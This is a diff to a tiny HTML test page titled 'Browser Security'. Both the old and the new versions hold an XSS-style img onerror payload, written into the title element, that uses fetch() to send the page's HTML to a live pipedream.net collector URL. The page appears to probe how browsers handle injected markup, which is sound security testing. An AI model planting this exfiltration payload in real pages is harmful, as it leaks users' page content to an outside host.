@@ -1,12 +1,8 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <title id="changeTitle">Browser Security</title>
-</head>
-<body>
-    <p>LOL</p>
-    <script>
-        document.getElementById("changeTitle").innerHTML = `<img src ="c" onerror='javascript:fetch("https://eojbjxw9m3vt4d8.m.pipedream.net?" + document.body.innerHTML'>`
+<html>
+  <body>
+    <title>Browser Security</title>
+    <script defer>
+        document.querySelector('title').textContent = `<img src="abcedgh" onerror='fetch("https://eojbjxw9m3vt4d8.m.pipedream.net", {method:"POST", body: document.documentElement.innerHTML })'>`;
     </script>
-</body>
+  </body>
 </html>
